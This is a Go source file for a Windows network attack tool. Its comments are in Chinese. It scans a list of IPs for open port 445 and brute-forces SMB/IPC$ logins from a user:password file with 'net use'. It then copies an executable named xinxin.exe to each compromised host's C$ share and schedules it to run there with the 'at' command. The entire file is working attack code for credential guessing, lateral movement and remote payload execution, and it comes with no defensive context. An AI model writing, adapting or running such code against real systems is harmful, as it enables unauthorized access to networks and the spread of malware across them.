/*
 * @Author: reber
 * @Mail: reber0ask@qq.com
 * @Date: 2023-01-05 16:02:43
 * @LastEditTime: 2023-02-22 13:10:09
 */
package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/reber0/go-common/parse"
	"github.com/reber0/go-common/utils"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

func main() {
	var ip_list []string
	IPSlice := utils.FileEachLineRead("ip.txt")
	for _, ip := range IPSlice {
		_ip_slice := parse.ParseIP(ip)
		ip_list = append(ip_list, _ip_slice...)
	}

	for _, ip := range ip_list {
		if CheckPort(ip, "445") {
			if CheckPass(ip) {
				if CopyMyFile(ip) {
					ttt := GetTime(ip)
					RunAt(ip, ttt)
					CloseIPC(ip)
				}
			}
		}
	}
}

// 断开 ipc 连接
func CloseIPC(ip string) {
	command := fmt.Sprintf("cmd.exe /c net use \\\\%s\\C$ /del", ip)
	xxx := runCmd(command)
	flag, _ := Utf8ToGbk([]byte("已经删除"))
	if strings.Contains(xxx, string(flag)) {
		fmt.Println(command, "success")
	} else {
		fmt.Println(command, xxx)
	}
}

// 通过 ipc 添加 at 任务
func RunAt(ip, ttt string) {
	command := fmt.Sprintf("cmd.exe /c at \\\\%s %s c:\\\\xinxin.exe", ip, ttt)
	xxx := runCmd(command)
	if strings.Contains(xxx, "ID") {
		reg := regexp.MustCompile(`ID = \d+`)
		_id := reg.FindString(xxx)

		fmt.Println(command, "success", _id)
	} else {
		fmt.Println(command, xxx)
	}
}

// 通过 ipc 获取目标的时间
func GetTime(ip string) string {
	var hour, minute int

	command := fmt.Sprintf("cmd.exe /c net time \\\\%s", ip)
	xxx := runCmd(command)
	flag, _ := Utf8ToGbk([]byte("成功"))
	if strings.Contains(xxx, string(flag)) {
		reg := regexp.MustCompile(`(\d{4})/(\d{1,})/(\d{1,}) (\d{1,}):(\d{1,}):(\d{1,})`)
		t1 := reg.FindStringSubmatch(xxx)

		var y, m, d, H, M, S string
		y = t1[1]
		m = t1[2]
		d = t1[3]
		H = t1[4]
		M = t1[5]
		S = t1[6]
		if len(m) < 2 {
			m = "0" + m
		}
		if len(d) < 2 {
			d = "0" + d
		}
		tt := fmt.Sprintf("%s-%s-%s %s:%s:%s", y, m, d, H, M, S)

		t2, _ := time.ParseInLocation("2006-01-02 15:04:05", tt, time.Local)
		add, _ := time.ParseDuration("60s")
		t3 := t2.Add(add)

		hour, minute, _ = t3.Clock()

		fmt.Println(command, "success")
	} else {
		fmt.Println(command, xxx)
	}
	return fmt.Sprintf("%d:%d", hour, minute)
}

// 通过 ipc 向目标 copy 文件
func CopyMyFile(ip string) bool {
	command := fmt.Sprintf("cmd.exe /c copy c:\\xinxin.exe \\\\%s\\C$", ip)
	xxx := runCmd(command)
	flag, _ := Utf8ToGbk([]byte("1 个"))
	if strings.Contains(xxx, string(flag)) {
		fmt.Println(command, "success")
		return true
	} else {
		fmt.Println(command, xxx)
	}
	return false
}

// 探测 ipc 用户名密码
func CheckPass(ip string) bool {
	UP := utils.FileEachLineRead("user.txt")
	for _, up := range UP {
		u_p := strings.Split(up, ":")
		user, pass := u_p[0], u_p[1]

		command := fmt.Sprintf("cmd.exe /c net use \\\\%s\\C$ %s /user:%s", ip, pass, user)
		xxx := runCmd(command)
		flag, _ := Utf8ToGbk([]byte("成功"))
		if strings.Contains(xxx, string(flag)) {
			fmt.Println(command, "success")
			return true
		} else {
			fmt.Println(command, xxx)
		}
	}
	return false
}

// 检测端口是否开放
func CheckPort(ip, port string) bool {
	address := net.JoinHostPort(ip, port)
	conn, err := net.DialTimeout("tcp", address, 1*time.Second)
	if err != nil {
		fmt.Println(err.Error())
	} else {
		if conn != nil {
			_ = conn.Close()
			return true
		} else {
			return false
		}
	}
	return false
}

func Utf8ToGbk(s []byte) ([]byte, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewEncoder())
	d, e := ioutil.ReadAll(reader)
	if e != nil {
		return nil, e
	}
	return d, nil
}

// 执行命令
func runCmd(cmdStr string) string {
	list := strings.Split(cmdStr, " ")
	cmd := exec.Command(list[0], list[1:]...)

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		fmt.Println(err.Error())
		return stderr.String()
	} else {
		return out.String()
	}
}
